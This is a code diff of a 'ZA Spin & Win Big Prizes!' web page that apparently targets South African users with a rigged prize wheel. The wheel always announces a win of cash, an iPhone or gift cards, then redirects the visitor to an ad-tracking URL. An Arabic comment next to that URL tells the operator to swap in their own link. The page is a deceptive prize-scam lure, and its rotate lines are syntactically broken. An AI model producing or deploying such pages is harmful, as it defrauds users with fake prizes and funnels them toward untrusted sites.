@@ -9,7 +9,7 @@ body {
   margin: 0;
   font-family: Arial, sans-serif;
   background: linear-gradient(135deg, #6a11cb, #ff0844);
-  color: #fff;
+  color: white;
   text-align: center;
 }
 
@@ -17,102 +17,146 @@ body {
   padding: 40px 20px;
 }
 
-#wheel-container {
-  position: relative;
-  margin: 30px auto;
-  width: 300px;
-  height: 300px;
+h1 {
+  margin-bottom: 10px;
 }
 
-#wheel {
-  width: 100%;
-  height: 100%;
-  border-radius: 50%;
-  border: 10px solid #fff;
-  transition: transform 4s ease-out;
+#wheel-box {
+  position: relative;
+  margin: 30px auto;
+  width: 320px;
+  height: 320px;
 }
 
 #pointer {
   position: absolute;
-  top: -15px;
+  top: -18px;
   left: 50%;
   transform: translateX(-50%);
   width: 0;
   height: 0;
-  border-left: 15px solid transparent;
-  border-right: 15px solid transparent;
+  border-left: 16px solid transparent;
+  border-right: 16px solid transparent;
   border-bottom: 30px solid #fff;
 }
 
+canvas {
+  background: #fff;
+  border-radius: 50%;
+  border: 8px solid #fff;
+}
+
 button {
-  margin-top: 20px;
-  padding: 15px 40px;
+  margin-top: 25px;
+  padding: 15px 45px;
   font-size: 18px;
   border-radius: 30px;
   border: none;
   background: #ff9800;
-  color: #fff;
+  color: white;
   cursor: pointer;
+}
+
+button:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+small {
+  display: block;
+  margin-top: 15px;
+  opacity: 0.8;
 }
 </style>
 </head>
 
 <body>
+
 <div class="container">
   <h1>ZA Spin & Win Big Prizes!</h1>
   <p>Your chance to win today 🎉</p>
 
-  <div id="wheel-container">
+  <div id="wheel-box">
     <div id="pointer"></div>
     <canvas id="wheel" width="300" height="300"></canvas>
   </div>
 
-  <button onclick="spin()">SPIN NOW</button>
+  <button id="spinBtn">SPIN NOW</button>
+
   <small>* Promotional game · No purchase required</small>
 </div>
 
 <script>
-const prizes = ["R1000 Cash","iPhone 15","Free Airtime","Takealot Gift Card"];
-const colors = ["#ff5252","#ffca28","#66bb6a","#42a5f5"];
+const prizes = [
+  "R1000 Cash",
+  "iPhone 15",
+  "Free Airtime",
+  "Takealot Gift Card"
+];
+
+const colors = [
+  "#ff5252",
+  "#ffca28",
+  "#66bb6a",
+  "#42a5f5"
+];
 
 const canvas = document.getElementById("wheel");
 const ctx = canvas.getContext("2d");
-let angle = 0;
+const spinBtn = document.getElementById("spinBtn");
+
+let currentAngle = 0;
+let spinning = false;
 
 function drawWheel() {
+  ctx.clearRect(0, 0, 300, 300);
   const arc = (2 * Math.PI) / prizes.length;
+
   for (let i = 0; i < prizes.length; i++) {
     ctx.beginPath();
     ctx.fillStyle = colors[i];
-    ctx.moveTo(150,150);
-    ctx.arc(150,150,150,arc*i,arc*(i+1));
+    ctx.moveTo(150, 150);
+    ctx.arc(150, 150, 150, arc * i, arc * (i + 1));
     ctx.fill();
 
     ctx.save();
-    ctx.translate(150,150);
-    ctx.rotate(arc*i + arc/2);
-    ctx.fillStyle = "#fff";
-    ctx.font = "16px Arial";
+    ctx.translate(150, 150);
+    ctx.rotate(arc * i + arc / 2);
     ctx.textAlign = "right";
-    ctx.fillText(prizes[i],140,5);
+    ctx.fillStyle = "#fff";
+    ctx.font = "bold 16px Arial";
+    ctx.fillText(prizes[i], 135, 6);
     ctx.restore();
   }
 }
 
 drawWheel();
 
-function spin(){
-  const prizeIndex = Math.floor(Math.random()*prizes.length);
-  const arc = 360/prizes.length;
-  const rotate = 360*5 + (360 - prizeIndex*arc - arc/2);
-  angle += rotate;
-  canvas.style.transform = rotate(${angle}deg);
+spinBtn.onclick = () => {
+  if (spinning) return;
+  spinning = true;
+  spinBtn.disabled = true;
 
-  setTimeout(()=>{
+  const prizeIndex = Math.floor(Math.random() * prizes.length);
+  const arc = 360 / prizes.length;
+  const spins = 5;
+
+  const rotateTo =
+    spins * 360 +
+    (360 - prizeIndex * arc - arc / 2);
+
+  currentAngle += rotateTo;
+  canvas.style.transition = "transform 4s ease-out";
+  canvas.style.transform = rotate(${currentAngle}deg);
+
+  setTimeout(() => {
     alert("🎉 You won: " + prizes[prizeIndex]);
+
+    // 🔴 غير اللينك ده
     window.location.href = "https://mediahqx.bountyads.store/?utm_medium=b8017b6ba61df93050bd920ec2b7a89c4f7a148a&utm_campaign=shmuelolo11";
-  },4200);
-}
+  }, 4200);
+};
 </script>
+
 </body>
 </html>
